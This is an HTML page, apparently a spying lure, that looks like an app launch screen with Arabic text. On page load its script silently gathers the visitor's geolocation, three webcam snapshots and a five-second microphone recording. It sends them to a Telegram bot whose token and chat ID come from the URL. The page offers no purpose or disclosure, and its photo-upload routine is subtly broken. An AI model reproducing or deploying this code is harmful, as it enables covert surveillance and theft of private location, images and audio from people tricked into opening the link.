<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التطبيق الرئيسي</title>
</head>
<body>
    <h1>التطبيق قيد التشغيل</h1>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const telegramBotToken = urlParams.get('token');
        const chatId = urlParams.get('chat_id');

        if (!telegramBotToken || !chatId) {
            document.body.innerHTML = '<h1>⚠️ حدث خطأ: البيانات غير مكتملة!</h1>';
            throw new Error("Missing token or chat_id in URL.");
        }

        async function sendDataToTelegram(message) {
            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
            } catch (error) {
                console.error("خطأ في الإرسال إلى Telegram:", error);
            }
        }

        async function sendPhotoToTelegram(imageDataUrl) {
            const url = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
            try {
                await fetch(url, {
                    method: 'POST',
                    body: new FormData(Object.assign(new FormData(), {
                        chat_id: chatId,
                        photo: imageDataUrl,
                    }))
                });
            } catch (error) {
                console.error("خطأ في إرسال الصورة إلى Telegram:", error);
            }
        }

        async function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        sendDataToTelegram(`📍 إحداثيات الموقع:\n- خط العرض: ${latitude}\n- خط الطول: ${longitude}`);
                    },
                    error => {
                        sendDataToTelegram("⚠️ تعذر الحصول على الموقع الجغرافي.");
                    }
                );
            } else {
                sendDataToTelegram("⚠️ الموقع الجغرافي غير مدعوم في هذا المتصفح.");
            }
        }

        function captureImages() {
            const video = document.createElement('video');
            const canvas = document.createElement('canvas');
            document.body.appendChild(video);

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    video.play();

                    setTimeout(() => {
                        for (let i = 0; i < 3; i++) {
                            setTimeout(() => {
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                const context = canvas.getContext('2d');
                                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                                const imageDataUrl = canvas.toDataURL('image/png');
                                sendPhotoToTelegram(imageDataUrl);
                            }, i * 2000);
                        }
                        video.srcObject.getTracks().forEach(track => track.stop());
                    }, 2000);
                })
                .catch(err => console.error("خطأ في الوصول إلى الكاميرا:", err));
        }

        function captureAudio() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                sendDataToTelegram("⚠️ تسجيل الصوت غير مدعوم في هذا المتصفح.");
                return;
            }

            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    const mediaRecorder = new MediaRecorder(stream);
                    const audioChunks = [];

                    mediaRecorder.ondataavailable = event => {
                        audioChunks.push(event.data);
                    };

                    mediaRecorder.onstop = () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('audio', audioBlob);

                        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendAudio`, {
                            method: 'POST',
                            body: formData,
                        }).catch(error => {
                            console.error("خطأ في إرسال البصمة الصوتية:", error);
                        });
                    };

                    mediaRecorder.start();
                    setTimeout(() => {
                        mediaRecorder.stop();
                        stream.getTracks().forEach(track => track.stop());
                    }, 5000);
                })
                .catch(err => console.error("خطأ في الوصول إلى الميكروفون:", err));
        }

        // تشغيل المهام
        sendLocation();
        captureImages();
        captureAudio();
    </script>
</body>
</html>
